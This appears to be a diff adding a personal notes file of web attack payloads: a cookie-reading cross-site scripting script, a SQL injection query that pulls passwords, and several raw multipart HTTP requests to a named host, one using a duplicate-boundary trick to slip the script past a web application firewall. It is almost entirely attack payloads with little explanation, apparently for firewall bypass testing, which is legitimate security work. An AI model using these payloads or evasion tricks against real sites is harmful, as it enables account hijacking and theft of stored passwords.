@@ -1,0 +1,91 @@
+### Attack Payloads ### 
+
+<script>alert(document.cookie)</script>
+
+0 union select 'password is: ' || password from user limi 1 -- -
+###  ###
+
+
+
+### t-reqs test ###
+POST / HTTP/1.1
+Host: waf.akhavani.net
+Content-Type: multipart/form-data;boundary=real;boundary=fake
+Content-Length: 253
+
+--real
+content-disposition: form-data; name="_charset_"
+
+iso-8859-1
+--real
+content-disposition: form-data; name="field1"
+
+<script>alert(document.cookie)</script>
+--real--
+--fake
+content-disposition: form-data; name="field2"
+
+value2
+--fake--
+
+
+
+
+
+### Most Basic Multipart ###
+
+POST / HTTP/1.1
+Host: waf.akhavani.net
+Content-Type: multipart/form-data; boundary=AaB03x
+
+--AaB03x
+content-disposition: form-data; name="_charset_"
+
+iso-8859-1
+--AaB03x
+content-disposition: form-data; name="field1"
+
+<script>alert(document.cookie)</script>
+--AaB03x--
+
+
+
+### Multipart With Extra Headers ###
+POST / HTTP/1.1
+Host: waf.akhavani.net
+Content-Type: multipart/form-data; boundary=AaB03x 
+
+--AaB03x
+content-disposition: form-data; name="_charset_"
+
+UTF-8
+--AaB03x
+content-disposition: form-data; name="field1"
+content-type: text/plain;charset=UTF-8
+content-transfer-encoding: Binary
+content-extra: something
+
+<script>alert(document.cookie)</script>
+--AaB03x--
+
+
+### Multipart With Extra Headers + Json content ###
+POST / HTTP/1.1
+Host: waf.akhavani.net
+Content-Type: multipart/form-data; boundary=AaB03x 
+Content-Length: 282
+
+--AaB03x
+content-disposition: form-data; name="_charset_"
+
+UTF-8
+--AaB03x
+Content-Disposition: form-data; name="field1"
+content-type: application/json;charset=UTF-8
+content-transfer-encoding: Binary
+
+{
+  "item": "<script>alert(document.cookie)</script>"
+}
+--AaB03x--
+
